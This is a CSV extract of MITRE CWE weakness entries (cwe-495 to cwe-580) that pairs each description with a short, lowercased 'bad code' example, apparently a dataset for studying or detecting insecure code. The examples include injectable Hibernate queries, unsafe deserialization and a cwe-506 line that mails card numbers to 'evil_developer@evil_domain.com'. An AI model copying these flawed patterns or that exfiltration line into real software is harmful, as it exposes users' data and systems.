cwe_id,cwe_name,description,extended_description,url,is_category,bad_code
cwe-495,private data structure returned from a public method,"the product has a method that is declared public, but returns a reference to a private data structure, which could then be modified in unexpected ways.","
            
         
         ",https://cwe.mitre.org/data/definitions/495.html,FALSE, language:javaprivate string[] colors;public string[] getcolors() {return colors;}
cwe-496,public data assigned to private array-typed field,assigning public data to a private array is equivalent to giving public access to the array.,"
            
         
         ",https://cwe.mitre.org/data/definitions/496.html,FALSE, language:javaprivate string[] userroles;public void setuserroles(string[] userroles) {this.userroles = userroles;}
cwe-497,exposure of sensitive system information to an unauthorized control sphere,the product does not properly prevent sensitive system-level information from being accessed by unauthorized actors who do not have the same level of access to the underlying system as the product does.,"network-based products, such as web applications, often run on top of an operating system or similar environment.  when the product communicates with outside parties, details about the underlying system are expected to remain hidden, such as path names for data files, other os users, installed packages, the application environment, etc. this system information may be provided by the product itself, or buried within diagnostic or debugging messages. debugging information helps an adversary learn about the system and form an attack plan.
	 an information exposure occurs when system data or debugging information leaves the program through an output stream or logging function that makes it accessible to unauthorized parties. using other weaknesses, an attacker could cause errors to occur; the response to these errors can reveal detailed system information, along with other impacts.  an attacker can use messages that reveal technologies, operating systems, and product versions to tune the attack against known vulnerabilities in these technologies. a product may use diagnostic methods that provide significant implementation details such as stack traces as part of its error handling mechanism.
         ",https://cwe.mitre.org/data/definitions/497.html,FALSE," language:cchar* path = getenv(""path"");...sprintf(stderr, ""cannot find exe on path %s\n"", path);"
cwe-498,cloneable class containing sensitive information,"the code contains a class with sensitive data, but the class is cloneable. the data can then be accessed by cloning the class.","cloneable classes are effectively open classes, since data cannot be hidden in them. classes that do not explicitly deny cloning can be cloned by any other class without running the constructor.
         ",https://cwe.mitre.org/data/definitions/498.html,FALSE," language:javapublic class cloneclient {public cloneclient() //throwsjava.lang.clonenotsupportedexception {teacher t1 = new teacher(""guddu"",""22,nagar road"");//...// do some stuff to remove the teacher.teacher t2 = (teacher)t1.clone();system.out.println(t2.name);}public static void main(string args[]) {new cloneclient();}}class teacher implements cloneable {public object clone() {try {return super.clone();}catch (java.lang.clonenotsupportedexception e) {throw new runtimeexception(e.tostring());}}public string name;public string clas;public teacher(string name,string clas) {this.name = name;this.clas = clas;}}"
cwe-499,serializable class containing sensitive data,"the code contains a class with sensitive data, but the class does not explicitly deny serialization. the data can be accessed by serializing the class through another class.","serializable classes are effectively open classes since data cannot be hidden in them. classes that do not explicitly deny serialization can be serialized by any other class, which can then in turn use the data stored inside it.
         ",https://cwe.mitre.org/data/definitions/499.html,FALSE," language:javaclass patientrecord {private string name;private string socialsecuritynum;public patient(string name,string ssn) {this.setname(name);this.setsocialsecuritynumber(ssn);}}"
cwe-50,path equivalence: '//multiple/leading/slash',"the product accepts path input in the form of multiple leading slash ('//multiple/leading/slash') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.","
            
            
         
         ",https://cwe.mitre.org/data/definitions/50.html,FALSE,missing
cwe-500,public static field not marked final,"an object contains a public static field that is not marked final, which might allow it to be modified in unexpected ways.","public static variables can be read without an accessor and changed without a mutator by any classes in the application.
         ",https://cwe.mitre.org/data/definitions/500.html,FALSE," language:c++class someappclass {public:static string apppropertiesconfigfile = ""app/properties.config"";...}"
cwe-501,trust boundary violation,the product mixes trusted and untrusted data in the same data structure or structured message.,"a trust boundary can be thought of as line drawn through a program. on one side of the line, data is untrusted. on the other side of the line, data is assumed to be trustworthy. the purpose of validation logic is to allow data to safely cross the trust boundary - to move from untrusted to trusted. a trust boundary violation occurs when a program blurs the line between what is trusted and what is untrusted. by combining trusted and untrusted data in the same data structure, it becomes easier for programmers to mistakenly trust unvalidated data.
         ",https://cwe.mitre.org/data/definitions/501.html,FALSE," language:javausrname = request.getparameter(""usrname"");if (session.getattribute(attr_usr) == null) {session.setattribute(attr_usr, usrname);}"
cwe-502,deserialization of untrusted data,the product deserializes untrusted data without sufficiently ensuring that the resulting data will be valid.,"
            
            
            
         
         ",https://cwe.mitre.org/data/definitions/502.html,FALSE," language:javatry {file file = new file(""object.obj"");objectinputstream in = new objectinputstream(new fileinputstream(file));javax.swing.jbutton button = (javax.swing.jbutton) in.readobject();in.close();}"
cwe-506,embedded malicious code,the product contains code that appears to be malicious in nature.,"malicious flaws have acquired colorful names, including trojan horse, trapdoor, timebomb, and logic-bomb. a developer might insert malicious code with the intent to subvert the security of a product or its host system at some time in the future. it generally refers to a program that performs a useful service but exploits rights of the program's user in a way the user does not intend.
         ",https://cwe.mitre.org/data/definitions/506.html,FALSE," language:javaboolean authorizecard(string ccn) {// authorize credit card....mailcardnumber(ccn, ""evil_developer@evil_domain.com"");}"
cwe-507,trojan horse,"the product appears to contain benign or useful functionality, but it also contains code that is hidden from normal operation that violates the intended security policy of the user or the system administrator.","
            
         
         ",https://cwe.mitre.org/data/definitions/507.html,FALSE,missing
cwe-508,non-replicating malicious code,non-replicating malicious code only resides on the target system or product that is attacked; it does not attempt to spread to other systems.,"
            
         
         ",https://cwe.mitre.org/data/definitions/508.html,FALSE,missing
cwe-509,replicating malicious code (virus or worm),"replicating malicious code, including viruses and worms, will attempt to attack other systems once it has successfully compromised the target system or the product.","
            
         
         ",https://cwe.mitre.org/data/definitions/509.html,FALSE,missing
cwe-51,path equivalence: '/multiple//internal/slash',"the product accepts path input in the form of multiple internal slash ('/multiple//internal/slash/') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.","
            
         
         ",https://cwe.mitre.org/data/definitions/51.html,FALSE,missing
cwe-510,trapdoor,"a trapdoor is a hidden piece of code that responds to a special input, allowing its user access to resources without passing through the normal security enforcement mechanism.","
            
         
         ",https://cwe.mitre.org/data/definitions/510.html,FALSE,missing
cwe-511,logic/time bomb,"the product contains code that is designed to disrupt the legitimate operation of the product (or its environment) when a certain time passes, or when a certain logical condition is met.","when the time bomb or logic bomb is detonated, it may perform a denial of service such as crashing the system, deleting critical data, or degrading system response time. this bomb might be placed within either a replicating or non-replicating trojan horse.
         ",https://cwe.mitre.org/data/definitions/511.html,FALSE,missing
cwe-512,spyware,"the product collects personally identifiable information about a human user or the user's activities, but the product accesses this information using other resources besides itself, and it does not require that user's explicit approval or direct input into the product.","""spyware"" is a commonly used term with many definitions and interpretations. in general, it is meant to refer to products that collect information or install functionality that human users might not allow if they were fully aware of the actions being taken by the software. for example, a user might expect that tax software would collect a social security number and include it when filing a tax return, but that same user would not expect gaming software to obtain the social security number from that tax software's data.
         ",https://cwe.mitre.org/data/definitions/512.html,FALSE,missing
cwe-514,covert channel,a covert channel is a path that can be used to transfer information in a way not intended by the system's designers.,"typically the system has not given authorization for the transmission and has no knowledge of its occurrence.
         ",https://cwe.mitre.org/data/definitions/514.html,FALSE," language:pythondef validate_password(actual_pw, typed_pw):if len(actual_pw) <> len(typed_pw):return 0for i in len(actual_pw):if actual_pw[i] <> typed_pw[i]:return 0return 1"
cwe-515,covert storage channel,a covert storage channel transfers information through the setting of bits by one program and the reading of those bits by another. what distinguishes this case from that of ordinary operation is that the bits are used to convey encoded information.,"covert storage channels occur when out-of-band data is stored in messages for the purpose of memory reuse. covert channels are frequently classified as either storage or timing channels. examples would include using a file intended to hold only audit information to convey user passwords--using the name of a file or perhaps status bits associated with it that can be read by all users to signal the contents of the file. steganography, concealing information in such a manner that no one but the intended recipient knows of the existence of the message, is a good example of a covert storage channel.
         ",https://cwe.mitre.org/data/definitions/515.html,FALSE,missing
cwe-516,deprecated: covert timing channel,this weakness can be found at cwe-385.,"
            prohibited
            this cwe has been deprecated.
            see description and name for possible suggestions of other cwes to consider.
            
               
            
         
         ",https://cwe.mitre.org/data/definitions/516.html,FALSE,missing
cwe-52,path equivalence: '/multiple/trailing/slash//',"the product accepts path input in the form of multiple trailing slash ('/multiple/trailing/slash//') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.","
            
            
            
         
         ",https://cwe.mitre.org/data/definitions/52.html,FALSE,missing
cwe-523,unprotected transport of credentials,login pages do not use adequate measures to protect the user name and password while they are in transit from the client to the server.,"
            
            
         
         ",https://cwe.mitre.org/data/definitions/523.html,FALSE,missing
cwe-524,use of cache containing sensitive information,"the code uses a cache that contains sensitive information, but the cache can be read by an actor outside of the intended control sphere.","
	   applications may use caches to improve efficiency when communicating with remote entities or performing intensive calculations.  a cache maintains a pool of objects, threads, connections, pages, financial data, passwords, or other resources to minimize the time it takes to initialize and access these resources.  if the cache is accessible to unauthorized actors, attackers can read the cache and obtain this sensitive information.
	 
         ",https://cwe.mitre.org/data/definitions/524.html,FALSE,missing
cwe-53,path equivalence: '\multiple\\internal\backslash',"the product accepts path input in the form of multiple internal backslash ('\multiple\trailing\\slash') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.","
            
            
         
         ",https://cwe.mitre.org/data/definitions/53.html,FALSE,missing
cwe-533,deprecated: information exposure through server log files,this entry has been deprecated because its abstraction was too low-level.  see cwe-532.,"
            prohibited
            this cwe has been deprecated.
            see description and name for possible suggestions of other cwes to consider.
            
               
            
         
         ",https://cwe.mitre.org/data/definitions/533.html,FALSE,missing
cwe-534,deprecated: information exposure through debug log files,this entry has been deprecated because its abstraction was too low-level.  see cwe-532.,"
            prohibited
            this cwe has been deprecated.
            see description and name for possible suggestions of other cwes to consider.
            
               
            
         
         ",https://cwe.mitre.org/data/definitions/534.html,FALSE,missing
cwe-535,exposure of information through shell error message,"a command shell error message indicates that there exists an unhandled exception in the web application code. in many cases, an attacker can leverage the conditions that cause these errors in order to gain unauthorized access to the system.","
            
         
         ",https://cwe.mitre.org/data/definitions/535.html,FALSE,missing
cwe-536,servlet runtime error message containing sensitive information,a servlet error message indicates that there exists an unhandled exception in your web application code and may provide useful information to an attacker.,"
            
         
         ",https://cwe.mitre.org/data/definitions/536.html,FALSE," language:javapublic void dopost(httpservletrequest request, httpservletresponse response) throws servletexception, ioexception {string username = request.getparameter(""username"");// may cause unchecked nullpointerexception.if (username.length() < 10) {...}}"
cwe-537,java runtime error message containing sensitive information,"in many cases, an attacker can leverage the conditions that cause unhandled exception errors in order to gain unauthorized access to the system.","
            
         
         ",https://cwe.mitre.org/data/definitions/537.html,FALSE," language:javapublic class inputfileread {private file readfile = null;private filereader reader = null;private string inputfilepath = null;private final string default_file_path = ""c:\\somedirectory\\"";public inputfileread() {inputfilepath = default_file_path;}public void setinputfile(string inputfile) {/* assume appropriate validation / encoding is used and privileges / permissions are preserved */}public void readinputfile() {try {reader = new filereader(readfile);...} catch (runtimeexception rex) {system.err.println(""error: cannot open input file in the directory "" + inputfilepath);system.err.println(""input file has not been set, call setinputfile method before calling readinputfile"");} catch (filenotfoundexception ex) {...}}}"
cwe-538,insertion of sensitive information into externally-accessible file or directory,"the product places sensitive information into files or directories that are accessible to actors who are allowed to have access to the files, but not to the sensitive information.","
            
         
         ",https://cwe.mitre.org/data/definitions/538.html,FALSE," language:javalogger.info(""username: "" + usernme + "", ccn: "" + ccn);"
cwe-54,path equivalence: 'filedir\' (trailing backslash),"the product accepts path input in the form of trailing backslash ('filedir\') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.","
            
            
         
         ",https://cwe.mitre.org/data/definitions/54.html,FALSE,missing
cwe-542,deprecated: information exposure through cleanup log files,this entry has been deprecated because its abstraction was too low-level.  see cwe-532.,"
            prohibited
            this cwe has been deprecated.
            see description and name for possible suggestions of other cwes to consider.
            
               
            
         
         ",https://cwe.mitre.org/data/definitions/542.html,FALSE,missing
cwe-543,use of singleton pattern without synchronization in a multithreaded context,the product uses the singleton pattern when creating a resource within a multithreaded environment.,"the use of a singleton pattern may not be thread-safe.
         ",https://cwe.mitre.org/data/definitions/543.html,FALSE, language:javaprivate static numberconverter singleton;public static numberconverter get_singleton() {if (singleton == null) {singleton = new numberconverter();}return singleton;}
cwe-544,missing standardized error handling mechanism,"the product does not use a standardized method for handling errors throughout the code, which might introduce inconsistent error handling and resultant weaknesses.","if the product handles error messages individually, on a one-by-one basis, this is likely to result in inconsistent error handling. the causes of errors may be lost. also, detailed information about the causes of an error may be unintentionally returned to the user.
         ",https://cwe.mitre.org/data/definitions/544.html,FALSE,missing
cwe-545,deprecated: use of dynamic class loading,"this weakness has been deprecated because it partially overlaps cwe-470, it describes legitimate programmer behavior, and other portions will need to be integrated into other entries.","
            prohibited
            this cwe has been deprecated.
            see description and name for possible suggestions of other cwes to consider.
            
               
            
         
         ",https://cwe.mitre.org/data/definitions/545.html,FALSE,missing
cwe-546,suspicious comment,"the code contains comments that suggest the presence of bugs, incomplete functionality, or weaknesses.","many suspicious comments, such as bug, hack, fixme, later, later2, todo, in the code indicate missing security functionality and checking. others indicate code problems that programmers should fix, such as hard-coded variables, error handling, not using stored procedures, and performance issues.
         ",https://cwe.mitre.org/data/definitions/546.html,FALSE, language:javaif (user == null) {// todo: handle null user condition.}
cwe-547,"use of hard-coded, security-relevant constants","the product uses hard-coded constants instead of symbolic names for security-critical values, which increases the likelihood of mistakes during code maintenance or security policy change.","if the developer does not find all occurrences of the hard-coded constants, an incorrect policy decision may be made if one of the constants is not changed. making changes to these values will require code changes that may be difficult or impossible once the system is released to the field. in addition, these hard-coded values may become available to attackers if the code is ever disclosed.
         ",https://cwe.mitre.org/data/definitions/547.html,FALSE," language:cchar buffer[1024];...fgets(buffer, 1024, stdin);"
cwe-549,missing password field masking,"the product does not mask passwords during entry, increasing the potential for attackers to observe and capture passwords.","
            
         
         ",https://cwe.mitre.org/data/definitions/549.html,FALSE,missing
cwe-55,path equivalence: '/./' (single dot directory),"the product accepts path input in the form of single dot directory exploit ('/./') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.","
            
         
         ",https://cwe.mitre.org/data/definitions/55.html,FALSE,missing
cwe-550,server-generated error message containing sensitive information,"certain conditions, such as network failure, will cause a server error message to be displayed.","while error messages in and of themselves are not dangerous, per se, it is what an attacker can glean from them that might cause eventual problems.
         ",https://cwe.mitre.org/data/definitions/550.html,FALSE,missing
cwe-553,command shell in externally accessible directory,a possible shell file exists in /cgi-bin/ or other accessible directories. this is extremely dangerous and can be used by an attacker to execute commands on the web server.,"
            
         
         ",https://cwe.mitre.org/data/definitions/553.html,FALSE,missing
cwe-558,use of getlogin() in multithreaded application,"the product uses the getlogin() function in a multithreaded context, potentially causing it to return incorrect values.","the getlogin() function returns a pointer to a string that contains the name of the user associated with the calling process. the function is not reentrant, meaning that if it is called from another process, the contents are not locked out and the value of the string can be changed by another process. this makes it very risky to use because the username can be changed by other processes, so the results of the function cannot be trusted.
         ",https://cwe.mitre.org/data/definitions/558.html,FALSE, language:cpwd = getpwnam(getlogin());if (istrustedgroup(pwd->pw_gid)) {allow();} else {deny();}
cwe-56,path equivalence: 'filedir*' (wildcard),"the product accepts path input in the form of asterisk wildcard ('filedir*') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.","
            
            
         
         ",https://cwe.mitre.org/data/definitions/56.html,FALSE,missing
cwe-560,use of umask() with chmod-style argument,the product calls umask() with an incorrect argument that is specified as if it is an argument to chmod().,"
            
         
         ",https://cwe.mitre.org/data/definitions/560.html,FALSE,missing
cwe-561,dead code,"the product contains dead code, which can never be executed.","dead code is code that can never be executed in a running program. the surrounding code makes it impossible for a section of code to ever be executed.
         ",https://cwe.mitre.org/data/definitions/561.html,FALSE," language:c++string s = null;if (b) {s = ""yes"";return;}if (s != null) {dead();}"
cwe-562,return of stack variable address,"a function returns the address of a stack variable, which will cause unintended program behavior, typically in the form of a crash.","because local variables are allocated on the stack, when a program returns a pointer to a local variable, it is returning a stack address. a subsequent function call is likely to re-use this same stack address, thereby overwriting the value of the pointer, which no longer corresponds to the same variable since a function's stack frame is invalidated when it returns. at best this will cause the value of the pointer to change unexpectedly. in many cases it causes the program to crash the next time the pointer is dereferenced.
         ",https://cwe.mitre.org/data/definitions/562.html,FALSE, language:cchar* getname() {char name[str_max];fillinname(name);return name;}
cwe-563,assignment to variable without use,"the variable's value is assigned but never used, making it a dead store.","after the assignment, the variable is either assigned another value or goes out of scope. it is likely that the variable is simply vestigial, but it is also possible that the unused variable points out a bug.
         ",https://cwe.mitre.org/data/definitions/563.html,FALSE, language:cr = getname();r = getnewbuffer(buf);
cwe-564,sql injection: hibernate,using hibernate to execute a dynamic sql statement built with user-controlled input can allow an attacker to modify the statement's meaning or to execute arbitrary sql commands.,"
             
             
             
         
         ",https://cwe.mitre.org/data/definitions/564.html,FALSE," language:javastring street = getstreetfromuser();query query = session.createquery(""from address a where a.street='"" + street + ""'"");"
cwe-565,reliance on cookies without validation and integrity checking,"the product relies on the existence or values of cookies when performing security-critical operations, but it does not properly ensure that the setting is valid for the associated user.","attackers can easily modify cookies, within the browser or by implementing the client-side code outside of the browser. reliance on cookies without detailed validation and integrity checking can allow attackers to bypass authentication, conduct injection attacks such as sql injection and cross-site scripting, or otherwise modify inputs in unexpected ways.
         ",https://cwe.mitre.org/data/definitions/565.html,FALSE," language:javacookie[] cookies = request.getcookies();for (int i =0; i< cookies.length; i++) {cookie c = cookies[i];if (c.getname().equals(""role"")) {userrole = c.getvalue();}}"
cwe-566,authorization bypass through user-controlled sql primary key,"the product uses a database table that includes records that should not be accessible to an actor, but it executes a sql statement with a primary key that can be controlled by that actor.","
            when a user can set a primary key to any value, then the user can modify the key to point to unauthorized records.
            database access control errors occur when:
               
                  data enters a program from an untrusted source.
                  the data is used to specify the value of a primary key in a sql query.
                  the untrusted source does not have the permissions to be able to access all rows in the associated table.
               
         
         ",https://cwe.mitre.org/data/definitions/566.html,FALSE," language:c#...conn = new sqlconnection(_connectionstring);conn.open();int16 id = system.convert.toint16(invoiceid.text);sqlcommand query = new sqlcommand( ""select * from invoices where id = @id"", conn);query.parameters.addwithvalue(""@id"", id);sqldatareader objreader = objcommand.executereader();..."
cwe-567,unsynchronized access to shared data in a multithreaded context,"the product does not properly synchronize shared data, such as static variables across threads, which can lead to undefined behavior and unpredictable data changes.","
            within servlets, shared static variables are not protected from concurrent access, but servlets are multithreaded. this is a typical programming mistake in j2ee applications, since the multithreading is handled by the framework. when a shared variable can be influenced by an attacker, one thread could wind up modifying the variable to contain data that is not valid for a different thread that is also using the data within the variable.
            note that this weakness is not unique to servlets.
         
         ",https://cwe.mitre.org/data/definitions/567.html,FALSE," language:javapublic static class counter extends httpservlet {static int count = 0;protected void doget(httpservletrequest in, httpservletresponse out)throws servletexception, ioexception {out.setcontenttype(""text/plain"");printwriter p = out.getwriter();count++;p.println(count + "" hits so far!"");}}"
cwe-568,finalize() method without super.finalize(),the product contains a finalize() method that does not call super.finalize().,"the java language specification states that it is a good practice for a finalize() method to call super.finalize().
         ",https://cwe.mitre.org/data/definitions/568.html,FALSE, language:javaprotected void finalize() {discardnative();}
cwe-57,path equivalence: 'fakedir/../realdir/filename',"the product contains protection mechanisms to restrict access to 'realdir/filename', but it constructs pathnames using external input in the form of 'fakedir/../realdir/filename' that are not handled by those mechanisms. this allows attackers to perform unauthorized actions against the targeted file.","
            
         
         ",https://cwe.mitre.org/data/definitions/57.html,FALSE,missing
cwe-570,expression is always false,the product contains an expression that will always evaluate to false.,"
            
            
         
         ",https://cwe.mitre.org/data/definitions/570.html,FALSE," language:javapublic void updateuseraccountorder(string productnumber, string accountnumber) {boolean isvalidproduct = false;boolean isvalidaccount = false;if (validproductnumber(productnumber)) {isvalidproduct = true;updateinventory(productnumber);}else {return;}if (validaccountnumber(accountnumber)) {isvalidproduct = true;updateaccount(accountnumber, productnumber);}if (isvalidproduct && isvalidaccount) {updateaccountorder(accountnumber, productnumber);}}"
cwe-571,expression is always true,the product contains an expression that will always evaluate to true.,"
            
            
         
         ",https://cwe.mitre.org/data/definitions/571.html,FALSE, language:javapublic void updateinventory(string productnumber) {boolean isproductavailable = false;boolean isdelayed = false;if (productinstore(productnumber)) {isproductavailable = true;updateinstoredatabase(productnumber);}else if (productinwarehouse(productnumber)) {isproductavailable = true;updateinwarehousedatabase(productnumber);}else {isproductavailable = true;}if ( isproductavailable ) {updateproductdatabase(productnumber);}else if ( isdelayed ) {/* warn customer about delay before order processing */...}}
cwe-572,call to thread run() instead of start(),"the product calls a thread's run() method instead of calling start(), which causes the code to run in the thread of the caller instead of the callee.","in most cases a direct call to a thread object's run() method is a bug. the programmer intended to begin a new thread of control, but accidentally called run() instead of start(), so the run() method will execute in the caller's thread of control.
         ",https://cwe.mitre.org/data/definitions/572.html,FALSE, language:javathread thr = new thread() {public void run() {...}};thr.run();
cwe-573,improper following of specification by caller,"the product does not follow or incorrectly follows the specifications as required by the implementation language, environment, framework, protocol, or platform.","when leveraging external functionality, such as an api, it is important that the caller does so in accordance with the requirements of the external functionality or else unintended behaviors may result, possibly leaving the system vulnerable to any number of exploits.
         ",https://cwe.mitre.org/data/definitions/573.html,FALSE,missing
cwe-574,ejb bad practices: use of synchronization primitives,the product violates the enterprise javabeans (ejb) specification by using thread synchronization primitives.,"the enterprise javabeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any ejb container. in this case, the product violates the following ejb guideline: ""an enterprise bean must not use thread synchronization primitives to synchronize execution of multiple instances."" the specification justifies this requirement in the following way: ""this rule is required to ensure consistent runtime semantics because while some ejb containers may use a single jvm to execute all enterprise bean's instances, others may distribute the instances across multiple jvms.""
         ",https://cwe.mitre.org/data/definitions/574.html,FALSE," language:java@entitypublic class customer implements serializable {private string id;private string firstname;private string lastname;private address address;public customer() {...}public customer(string id, string firstname, string lastname) {...}@idpublic string getcustomerid() {...}public synchronized void setcustomerid(string id) {...}public string getfirstname() {...}public synchronized void setfirstname(string firstname) {...}public string getlastname() {...}public synchronized void setlastname(string lastname) {...}@onetoone()public address getaddress() {...}public synchronized void setaddress(address address) {...}}"
cwe-575,ejb bad practices: use of awt swing,the product violates the enterprise javabeans (ejb) specification by using awt/swing.,"the enterprise javabeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any ejb container. in this case, the product violates the following ejb guideline: ""an enterprise bean must not use the awt functionality to attempt to output information to a display, or to input information from a keyboard."" the specification justifies this requirement in the following way: ""most servers do not allow direct interaction between an application program and a keyboard/display attached to the server system.""
         ",https://cwe.mitre.org/data/definitions/575.html,FALSE," language:java@statelesspublic class convertersessionbean extends component implements keylistener, convertersessionremote {/* member variables for receiving keyboard input using awt api */...private stringbuffer enteredtext = new stringbuffer();/* conversion rate on us dollars to yen */private bigdecimal yenrate = new bigdecimal(""115.3100"");public convertersessionbean() {super();/* method calls for setting up awt component for receiving keyboard input */...addkeylistener(this);}public bigdecimal dollartoyen(bigdecimal dollars) {bigdecimal result = dollars.multiply(yenrate);return result.setscale(2, bigdecimal.round_down);}/* member functions for implementing awt keylistener interface */public void keytyped(keyevent event) {...}public void keypressed(keyevent e) {}public void keyreleased(keyevent e) {}/* member functions for receiving keyboard input and displaying output */public void paint(graphics g) {...}...}"
cwe-576,ejb bad practices: use of java i/o,the product violates the enterprise javabeans (ejb) specification by using the java.io package.,"the enterprise javabeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any ejb container. in this case, the product violates the following ejb guideline: ""an enterprise bean must not use the java.io package to attempt to access files and directories in the file system."" the specification justifies this requirement in the following way: ""the file system apis are not well-suited for business components to access data. business components should use a resource manager api, such as jdbc, to store data.""
         ",https://cwe.mitre.org/data/definitions/576.html,FALSE, language:java@statelesspublic class interestratebean implements interestrateremote {private document interestratexmldocument = null;private file interestratefile = null;public interestratebean() {try {/* get xml document from the local filesystem */interestratefile = new file(constants.interest_rate_file);if (interestratefile.exists()){documentbuilderfactory dbf = documentbuilderfactory.newinstance();documentbuilder db = dbf.newdocumentbuilder();interestratexmldocument = db.parse(interestratefile);}} catch (ioexception ex) {...}}public bigdecimal getinterestrate(integer points) {return getinterestratefromxml(points);}/* member function to retrieve interest rate from xml document on the local file system */private bigdecimal getinterestratefromxml(integer points) {...}}
cwe-577,ejb bad practices: use of sockets,the product violates the enterprise javabeans (ejb) specification by using sockets.,"the enterprise javabeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any ejb container. in this case, the product violates the following ejb guideline: ""an enterprise bean must not attempt to listen on a socket, accept connections on a socket, or use a socket for multicast."" the specification justifies this requirement in the following way: ""the ejb architecture allows an enterprise bean instance to be a network socket client, but it does not allow it to be a network server. allowing the instance to become a network server would conflict with the basic function of the enterprise bean-- to serve the ejb clients.""
         ",https://cwe.mitre.org/data/definitions/577.html,FALSE, language:java@statelesspublic class stocksymbolbean implements stocksymbolremote {serversocket serversocket = null;socket clientsocket = null;public stocksymbolbean() {try {serversocket = new serversocket(constants.socket_port);} catch (ioexception ex) {...}try {clientsocket = serversocket.accept();} catch (ioexception e) {...}}public string getstocksymbol(string name) {...}public bigdecimal getstockvalue(string symbol) {...}private void processclientinputfromsocket() {...}}
cwe-578,ejb bad practices: use of class loader,the product violates the enterprise javabeans (ejb) specification by using the class loader.,"the enterprise javabeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any ejb container. in this case, the product violates the following ejb guideline: ""the enterprise bean must not attempt to create a class loader; obtain the current class loader; set the context class loader; set security manager; create a new security manager; stop the jvm; or change the input, output, and error streams."" the specification justifies this requirement in the following way: ""these functions are reserved for the ejb container. allowing the enterprise bean to use these functions could compromise security and decrease the container's ability to properly manage the runtime environment.""
         ",https://cwe.mitre.org/data/definitions/578.html,FALSE, language:java@statelesspublic class interestratebean implements interestrateremote {private document interestratexmldocument = null;public interestratebean() {try {// get xml document from the local filesystem as an input stream// using the classloader for this classclassloader loader = this.getclass().getclassloader();inputstream in = loader.getresourceasstream(constants.interest_rate_file);documentbuilderfactory dbf = documentbuilderfactory.newinstance();documentbuilder db = dbf.newdocumentbuilder();interestratexmldocument = db.parse(interestratefile);} catch (ioexception ex) {...}}public bigdecimal getinterestrate(integer points) {return getinterestratefromxml(points);}/* member function to retrieve interest rate from xml document on the local file system */private bigdecimal getinterestratefromxml(integer points) {...}}
cwe-579,j2ee bad practices: non-serializable object stored in session,"the product stores a non-serializable object as an httpsession attribute, which can hurt reliability.","a j2ee application can make use of multiple jvms in order to improve application reliability and performance. in order to make the multiple jvms appear as a single application to the end user, the j2ee container can replicate an httpsession object across multiple jvms so that if one jvm becomes unavailable another can step in and take its place without disrupting the flow of the application. this is only possible if all session data is serializable, allowing the session to be duplicated between the jvms.
         ",https://cwe.mitre.org/data/definitions/579.html,FALSE," language:javapublic class dataglob {string globname;string globvalue;public void addtosession(httpsession session) {session.setattribute(""glob"", this);}}"
cwe-58,path equivalence: windows 8.3 filename,"the product contains a protection mechanism that restricts access to a long filename on a windows operating system, but it does not properly restrict access to the equivalent short ""8.3"" filename.","on later windows operating systems, a file can have a ""long name"" and a short name that is compatible with older windows file systems, with up to 8 characters in the filename and 3 characters for the extension. these ""8.3"" filenames, therefore, act as an alternate name for files with long names, so they are useful pathname equivalence manipulations.
         ",https://cwe.mitre.org/data/definitions/58.html,FALSE,missing
cwe-580,clone() method without super.clone(),the product contains a clone() method that does not call super.clone() to obtain the new object.,"all implementations of clone() should obtain the new object by calling super.clone(). if a class does not follow this convention, a subclass's clone() method will return an object of the wrong type.
         ",https://cwe.mitre.org/data/definitions/580.html,FALSE, language:javapublic class kibitzer {public object clone() throws clonenotsupportedexception {object returnme = new kibitzer();...}}public class fancykibitzer extends kibitzer{public object clone() throws clonenotsupportedexception {object returnme = super.clone();...}}
